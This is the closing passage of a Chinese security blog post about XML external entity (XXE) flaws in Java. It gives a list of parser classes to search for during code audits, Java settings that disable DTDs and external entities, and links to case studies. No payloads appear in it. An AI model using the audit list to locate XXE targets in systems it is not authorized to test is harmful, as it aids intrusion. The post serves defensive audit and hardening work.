<h1 id="xlsx-streamer-XXE"><a href="#xlsx-streamer-XXE" class="headerlink" title="xlsx-streamer XXE"></a>xlsx-streamer XXE</h1><p>&emsp;&emsp; xlsx-streamer XXE漏洞与Poi ooxml XXE类似，具体查看<a href="https://www.itread01.com/hkpcyyp.html" target="_blank" rel="noopener">参考链接</a>笔者这里就不过多的叙述了。</p>
<hr>
<h1 id="代码审计技巧"><a href="#代码审计技巧" class="headerlink" title="代码审计技巧"></a>代码审计技巧</h1><p><strong>查找关键字</strong></p>
<pre><code>javax.xml.parsers.DocumentBuilderFactory;
javax.xml.parsers.SAXParser
javax.xml.transform.TransformerFactory
javax.xml.validation.Validator
javax.xml.validation.SchemaFactory
javax.xml.transform.sax.SAXTransformerFactory
javax.xml.transform.sax.SAXSource
org.xml.sax.XMLReader
org.xml.sax.helpers.XMLReaderFactory
org.dom4j.io.SAXReader
org.jdom.input.SAXBuilder
org.jdom2.input.SAXBuilder
javax.xml.bind.Unmarshaller
javax.xml.xpath.XpathExpression
javax.xml.stream.XMLStreamReader
org.apache.commons.digester3.Digester
…………</code></pre><hr>
<h1 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一般的防护</span></span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//xinclude防护</span></span><br><span class="line">dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="推荐案例"><a href="#推荐案例" class="headerlink" title="推荐案例"></a>推荐案例</h1><p><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">收集了很多国内外知名厂商出现案例</a><br><a href="https://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">基础知识文章XXE</a><br><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">XXE更多骚操作</a><br><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="noopener">Apache Solr XXE漏洞分析 -【CVE-2018-8026 】</a></p>
<hr>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_40918067/article/details/90950535" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40918067/article/details/90950535</a><br><a href="https://github.com/JoyChou93/java-sec-code/wiki/XXE" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/XXE</a><br><a href="https://blog.csdn.net/hua1017177499/article/details/78985166" target="_blank" rel="noopener">https://blog.csdn.net/hua1017177499/article/details/78985166</a><br><a href="https://p0rz9.github.io/2019/02/27/xxe/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/02/27/xxe/</a><br><a href="https://www.anquanke.com/post/id/156227" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227</a><br><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">https://www.jianshu.com/p/73cd11d83c30</a><br><a href="https://www.itread01.com/hkpcyyp.html" target="_blank" rel="noopener">https://www.itread01.com/hkpcyyp.html</a></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='https://link.hhtjim.com/163/574566207.mp3'></li>
                        
                    
                        
                            <li title='1' data-url='https://link.hhtjim.com/qq/playsong.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='a69212da3fc88cd39af9'
        data-cs='33d19613b15eb03266763f3a34a0d745cd545464'
        data-r='gittalk'
        data-o='summersec'
        data-a='summersec'
        data-d='true'
    >查看评论</div>


    </div>
    
        <div class='side'>
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞简介"><span class="toc-number">2.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#有回显"><span class="toc-number">3.</span> <span class="toc-text">有回显</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#无回显"><span class="toc-number">4.</span> <span class="toc-text">无回显</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Xinclude"><span class="toc-number">5.</span> <span class="toc-text">Xinclude</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload分享"><span class="toc-number">5.1.</span> <span class="toc-text">Payload分享</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Poi-ooxml-XXE"><span class="toc-number">6.</span> <span class="toc-text">Poi ooxml XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2014-3529"><span class="toc-number">6.1.</span> <span class="toc-text">CVE-2014-3529</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-5644"><span class="toc-number">6.2.</span> <span class="toc-text">CVE-2017-5644</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xlsx-streamer-XXE"><span class="toc-number">7.</span> <span class="toc-text">xlsx-streamer XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#代码审计技巧"><span class="toc-number">8.</span> <span class="toc-text">代码审计技巧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE防御"><span class="toc-number">9.</span> <span class="toc-text">XXE防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#推荐案例"><span class="toc-number">10.</span> <span class="toc-text">推荐案例</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">11.</span> <span class="toc-text">参考</span></a></li></ol>
        </div>
    
</div>


    </div>
</div>
<span id="busuanzi_container_page_pv">
   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
</span>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/diaspora.js"></script>
<script src="/js/snow.js"></script>
<script src="/js/test.js"></script>
<script src="/js/tx.js"></script>
<script src="/js/x.js"></script>
<script src="/js/xiantiao.js"></script>
<script src="/js/baidu.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>


<!-- 在想要使用窗口小部件的地方插入该标签 -->
<iframe width="900" height="401" src="https://cybermap.kaspersky.com/cn/widget/dynamic/dark" frameborder="0">


<script type="text/javascript" src="//rf.revolvermaps.com/0/0/6.js?i=5jbaycl6wsf&amp;m=7&amp;c=e63100&amp;cr1=ffffff&amp;f=arial&amp;l=0&amp;bv=90&amp;lx=-420&amp;ly=420&amp;hi=20&amp;he=7&amp;hc=a8ddff&amp;rs=80" async="async"></script>




<!-- Google Analytics -->
<script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', '218065278', 'auto');
  ga('send', 'pageview');
</script>
<!-- End Google Analytics -->


</html>
